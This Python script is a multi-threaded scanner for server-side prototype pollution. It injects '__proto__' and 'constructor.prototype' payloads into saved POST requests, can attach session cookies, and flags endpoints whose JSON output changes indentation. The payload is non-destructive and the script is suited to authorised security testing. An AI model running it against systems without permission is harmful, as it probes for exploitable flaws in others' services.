import requests
import json
import argparse
from concurrent.futures import ThreadPoolExecutor

# A non-destructive payload that attempts to alter JSON response formatting.
POLLUTION_PAYLOADS = {
    '__proto__.json spaces': 10,
    'constructor.prototype.json spaces': 10
}

def test_endpoint(request_info, cookies):
    """Tests a single endpoint for prototype pollution."""
    url = request_info["url"]
    original_post_data = request_info["post_data"]
    content_type = request_info["content_type"]

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'PrototypePollutionTester/1.0',
        'Content-Type': content_type or 'application/x-www-form-urlencoded'
    })
    
    # Add custom cookies to the session if provided
    if cookies:
        for cookie in cookies:
            session.cookies.set(cookie['name'], cookie['value'], domain=cookie.get('domain'), path=cookie.get('path'))

    # Determine how to inject the payload based on Content-Type
    if 'application/json' in content_type and original_post_data:
        try:
            base_data = json.loads(original_post_data)
        except json.JSONDecodeError:
            # If post data is not valid JSON, we cannot inject into it.
            return
            
        for key, value in POLLUTION_PAYLOADS.items():
            # Create a copy to avoid modifying the base data for the next payload
            polluted_data = base_data.copy() 
            
            # Simple injection for top-level keys
            polluted_data[key] = value
            
            try:
                # Send the malicious request
                response = session.post(url, json=polluted_data, timeout=10)
                
                # Check for evidence of pollution
                if 'application/json' in response.headers.get('Content-Type', ''):
                    # Check if the response is indented with 10 spaces
                    if '\n          "' in response.text:
                        print(f"\n[!!!] VULNERABILITY DETECTED at: {url}")
                        print(f"  [+] Payload Key: {key}")
                        print(f"  [+] Evidence: JSON response appears to be indented with 10 spaces.\n")
                        return # Stop testing this endpoint after first finding
            except requests.RequestException:
                pass # Ignore network errors
    else:
        # For other content types like form data, we can try appending the payload.
        # This is less likely to succeed but is worth trying.
        for key, value in POLLUTION_PAYLOADS.items():
            polluted_data_str = f"{original_post_data}&{key}={value}"
            try:
                response = session.post(url, data=polluted_data_str, timeout=10)
                if 'application/json' in response.headers.get('Content-Type', ''):
                    if '\n          "' in response.text:
                        print(f"\n[!!!] VULNERABILITY DETECTED at: {url}")
                        print(f"  [+] Payload Key: {key} (injected into form data)")
                        print(f"  [+] Evidence: JSON response appears to be indented with 10 spaces.\n")
                        return
            except requests.RequestException:
                pass


def main():
    """Main function to read requests and start the testing process."""
    parser = argparse.ArgumentParser(description="Multi-threaded prototype pollution tester.")
    parser.add_argument(
        "file", 
        default="post_requests.txt", 
        nargs="?",
        help="The file containing POST requests to test (default: post_requests.txt)."
    )
    parser.add_argument(
        "--cookies", 
        help='''Custom cookies as a JSON string for maintaining session. 
        Example: '[{"name": "session", "value": "xyz", "domain": ".example.com", "path": "/"}]' '''
    )
    parser.add_argument(
        "--threads", 
        type=int, 
        default=10, 
        help="Number of concurrent threads to use for testing."
    )
    args = parser.parse_args()

    try:
        with open(args.file, "r") as f:
            tasks = [json.loads(line) for line in f]
    except FileNotFoundError:
        print(f"[ERROR] Input file not found: {args.file}")
        return
    except json.JSONDecodeError:
        print(f"[ERROR] Could not parse the input file. Ensure it's a valid line-delimited JSON.")
        return

    custom_cookies = json.loads(args.cookies) if args.cookies else None

    print(f"--- Starting Tester on {len(tasks)} endpoints from {args.file} ---")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        # Submit all testing tasks to the thread pool
        executor.map(lambda task: test_endpoint(task, custom_cookies), tasks)

    print("--- Tester finished ---")

if __name__ == "__main__":
    main()